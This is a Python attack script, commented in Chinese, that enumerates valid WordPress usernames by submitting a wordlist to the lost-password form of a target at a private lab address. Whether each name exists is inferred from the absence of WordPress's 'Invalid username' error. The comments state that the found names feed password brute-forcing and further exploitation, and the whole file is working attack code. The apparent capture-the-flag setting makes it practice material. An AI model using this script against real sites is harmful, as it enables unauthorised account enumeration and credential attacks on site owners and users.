import requests
#本项目适用于各类可以验证用户名存在信息的页面
#在WP登录后台存在找回密码功能，该功能通过向用户名发送邮箱来进行密码重置，并且会确认用户名是否存在，若不存在则返回错误信息。通过脚本批量测试用户名，可以枚举得到真实注册用户名，进而通过密码爆破再利用

# 密码重置请求的目标URL
url = "http://10.201.71.132/retro/wp-login.php?action=lostpassword"

# 使用with语句安全地打开文件
with open("/root/Desktop/username.txt", "r") as f:  # 字典路径
    # 使用splitlines()分隔每行
    usernames = f.read().splitlines()  


head = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Cookie": "s_cc=true; s_fid=158745682842C850-263A7EF749FE895F; s_nr=1755681388187; s_sq=nbcuglobal%2Cnbcuusanetworkd%3D%2526pid%253DMr.%252520Robot%252520%25253A%252520Who%252520Is%252520Mr.%252520Robot%252520%25253A%252520FSociety%252520Gallery%252520%25253A%252520Photo%2525202%2526pidt%253D1%2526oid%253D%25250A%252509%25250A%252509%252509%25250A%252509%252509%25250A%252509%25250A%2526oidt%253D3%2526ot%253DSUBMIT; wordpress_test_cookie=WP+Cookie+check"
}

# for循环遍历用户名列表进行密码重置请求
for username in usernames:
    # 构建POST请求的数据负载
    data = {
        "user_login": username,        # 要检查的用户名
        "redirect_to": "",             # 重定向URL（为空）
        "wp-submit": "Get+New+Password"  # 提交按钮的值
    }

    try:
        # 发送POST请求到密码重置页面
        res = requests.post(url, headers=head, data=data, timeout=10)

        # 检查响应中是否包含无效用户名的错误信息
        if "Invalid username or e-mail." not in res.text:  #错误信息依据不同系统变化 此处为WP的后台登录错误信息
            # 如果不包含错误信息，说明用户名有效
            print(f"有效用户名: {username}")

    except requests.exceptions.RequestException as e:
        # 处理请求过程中可能出现的异常
        continue  # 继续处理下一个用户名
